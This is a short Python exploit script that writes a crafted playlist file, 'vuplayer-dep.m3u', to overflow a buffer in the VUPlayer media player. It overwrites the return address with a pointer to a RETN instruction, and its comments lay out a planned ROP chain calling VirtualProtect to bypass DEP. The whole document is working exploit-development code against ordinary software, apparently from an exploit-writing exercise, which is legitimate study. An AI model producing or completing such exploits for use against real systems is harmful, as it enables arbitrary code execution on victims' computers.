import sys
import struct
import os

crash_file = "vuplayer-dep.m3u"

# GOALS
# EAX 90909090 => Nop                                                
# ECX <writeable pointer> => lpflOldProtect                                 
# EDX 00000040 => flNewProtect                             
# EBX 00000201 => dwSize                                            
# ESP ???????? => Leave as is                                         
# EBP ???????? => Call to ESP (jmp, call, push,..)                
# ESI ???????? => PTR to VirtualProtect - DWORD PTR of 0x1060E25C
# EDI 10101008 => ROP-Nop same as EIP

fuzz = "A" * 1012
fuzz += "\x08\x10\x10\x10" # 10101008  <-- Pointer to a RETN
fuzz += "C" * (3000 - len(fuzz))

makedafile = open(crash_file, "w")
makedafile.write(fuzz)
makedafile.close()